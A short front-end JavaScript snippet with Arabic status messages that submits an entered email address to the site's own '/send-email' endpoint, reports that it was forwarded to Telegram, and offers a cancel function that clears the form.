async function sendEmail() {
    const email = document.getElementById('emailInput').value;
    const status = document.getElementById('status');

    if (!email) {
        status.innerText = "الرجاء إدخال البريد الإلكتروني";
        status.style.color = "red";
        return;
    }

    status.innerText = "جاري الإرسال...";
    status.style.color = "#666";

    try {
        const response = await fetch('/send-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email })
        });

        if (response.ok) {
            status.innerText = "✅ تم الإرسال إلى تيليجرام بنجاح!";
            status.style.color = "green";
            document.getElementById('emailInput').value = '';
        } else {
            status.innerText = " حدث خطأ في السيرفر";
            status.style.color = "red";
        }
    } catch (error) {
        console.error('Error:', error);
        status.innerText = "❌ فشل الاتصال بالسيرفر";
        status.style.color = "red";
    }
}

function cancelAccess() {
    document.getElementById('status').innerText = "تم الإلغاء";
    document.getElementById('emailInput').value = '';
}